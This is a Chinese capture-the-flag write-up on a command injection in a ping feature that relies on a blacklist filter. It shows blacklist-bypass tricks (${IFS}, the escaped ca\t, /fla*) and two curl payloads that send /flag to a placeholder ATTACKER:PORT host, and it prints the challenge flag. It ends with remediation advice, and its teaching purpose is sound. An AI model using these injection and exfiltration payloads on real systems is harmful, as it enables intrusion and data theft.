# Ping To The Host

## 题目简述

页面接收一个主机地址并在后端执行 ping。输入最终进入 shell 命令，只经过简单黑名单过滤；被禁内容包括分号、重定向符、`cat`、空格、`sh`、`echo` 和 `flag` 等。目标是绕过字符串匹配并读取 `/flag`。

## 解题过程

黑名单并没有改变“用户输入由 shell 解释”这一根本问题。可以使用 `&&` 串联第二条命令，用 `${IFS}` 代替空格，用反斜杠拆开 `cat`，再用通配符绕过 `flag` 关键词。

若允许外带结果，可令目标服务器发起 HTTP 请求：

```text
127.0.0.1&&curl${IFS}http://ATTACKER:PORT/?a=`ca\t${IFS}/fla*|base64${IFS}-w${IFS}0`
```

各部分作用为：

- `ca\t` 在黑名单检查时不包含连续的 `cat`，交给 shell 后反斜杠被移除，实际命令为 `cat`；
- `${IFS}` 在 shell 展开为空白分隔符；
- `/fla*` 匹配 `/flag`，但原始输入中没有完整的 `flag`；
- `base64 -w 0` 把文件内容变成适合 URL 参数传输的单行文本；
- 命令替换的输出进入 `a` 参数，由攻击者自己的 HTTP 服务记录。

也可以直接把文件内容作为请求参数外带：

```text
127.0.0.1&&curl${IFS}http://ATTACKER:PORT/?a=`ca\t${IFS}/fla*`
```

对收到的数据进行 Base64 解码，得到：

```text
hgame{p1nG_t0_Comm4nD_ExecUt1on_dAngErRrRrRrR!}
```

## 方法总结

命令注入不能靠枚举危险字符修复，因为 shell 提供变量展开、命令替换、通配符、转义和大量等价语法。后端应绕过 shell，直接以参数数组调用 ping 程序，并对主机字段做 IP 地址或域名的严格语法校验，同时限制网络出口，降低外带风险。
